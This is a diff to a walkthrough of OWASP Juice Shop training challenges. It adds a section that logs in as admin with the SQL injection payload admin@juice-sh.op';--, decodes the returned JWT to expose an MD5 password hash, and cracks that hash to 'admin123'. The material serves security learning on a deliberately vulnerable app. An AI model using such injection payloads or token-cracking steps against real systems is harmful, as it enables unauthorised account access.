@@ -11,7 +11,7 @@ bender@juice-sh.op
 jim@juice-sh.op
 ```
 
-# Level 0 challenges
+# Level 1 challenges
 
 ## 01 Finding the score board
 To find the score board, we can inspect the links of the page and we see that /score-board isn't linked yet. With this, when we visit 
@@ -183,6 +183,47 @@ GG bois
 ```text
 Mr. N00dles
 ```
-
 Now we login, and we have solved the challenge!
+
+## 06 Password Strength
+For this challenge, I need to repeat basically the same thing I tried before, but with the admin account. First login with the payload
+```text
+admin@juice-sh.op';--
+```
+Observe the response and get the JWT Token. 
+```text
+eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsImlzQWRtaW4iOnRydWUsImxhc3RMb2dpbklwIjoiMTkyLjE2OC4yNC4xMjgiLCJwcm9maWxlSW1hZ2UiOiJkZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyMi0wMS0wOCAwMDoxMDoxNi41OTUgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyMi0wMS0wOCAwMDozODozMC44NTggKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNjQxNjA0MjQ5LCJleHAiOjE2NDE2MjIyNDl9.pDMGvTWI5MzQsj7-o1lmcUW8xkwpZ8riftxLGHkyPS2CSQ5upuS7kdDro_rUavXo2vCha3Omjm15ywqlQ-rEDS9X2KH_tE_qBFyYuAyevX7bGSjEZu3m89A6EOX_sqRZVrnfJYncLrWxbnZy0srVLBz8EJOdEQtMlP26imNoGOM
+```
+
+Decrypt the token
+```text
+{
+  "status": "success",
+  "data": {
+    "id": 1,
+    "username": "",
+    "email": "admin@juice-sh.op",
+    "password": "0192023a7bbd73250516f069df18b500",
+    "isAdmin": true,
+    "lastLoginIp": "192.168.24.128",
+    "profileImage": "default.svg",
+    "totpSecret": "",
+    "isActive": true,
+    "createdAt": "2022-01-08 00:10:16.595 +00:00",
+    "updatedAt": "2022-01-08 00:38:30.858 +00:00",
+    "deletedAt": null
+  },
+  "iat": 1641604249,
+  "exp": 1641622249
+}
+```
+
+Crack the MD5 hash
+```text
+admin123
+```
+
+Cool! We have the password for admin!
+We login with this, and the challenge is solved.
+
 
